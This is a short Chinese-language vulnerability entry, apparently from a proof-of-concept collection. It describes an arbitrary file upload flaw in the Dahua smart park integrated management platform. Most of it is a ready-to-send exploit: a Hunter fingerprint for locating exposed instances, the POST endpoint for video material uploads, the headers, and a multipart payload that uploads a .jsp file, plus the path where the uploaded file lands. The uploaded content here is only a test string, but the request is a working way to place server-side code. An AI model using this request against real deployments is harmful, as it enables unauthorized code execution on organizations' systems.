# 大华智慧园区综合管理平台video任意文件上传漏洞

- **系统**：大华　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="Dahua 大华 智慧园区管理平台"`\`
- **请求**：`POST /publishing/publishing/material/file/video HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 287`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="1ndex.jsp"
test
--00content0boundary00
Content-Disposition: form-data; name="file"
file
--00content0boundary00
Content-Disposition: form-data; name="Submit"
submit
--00content0boundary00--

上传文件位置：
/publishingImg/VIDEO/230812162057144051.jsp
```

**其他**
- 大华智慧园区综合管理平台video任意文件上传漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华智慧园区综合管理平台